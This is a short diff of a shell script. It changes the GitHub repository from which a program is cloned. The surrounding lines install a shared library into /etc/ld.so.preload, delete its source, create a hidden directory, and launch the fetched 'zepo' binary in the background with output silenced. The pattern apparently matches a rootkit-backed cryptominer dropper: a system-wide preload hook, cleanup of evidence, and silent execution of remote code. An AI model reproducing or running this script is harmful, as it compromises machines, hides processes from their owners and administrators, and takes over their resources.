@@ -7,7 +7,7 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .kap && cd .kap
-git clone https://github.com/6248202226/gradi.git
+git clone https://github.com/tyha4t57i/gradi.git
 cd gradi
 chmod +x 80.json && chmod +x zepo
 ./zepo -c "80.json" > /dev/null 2>&1 &
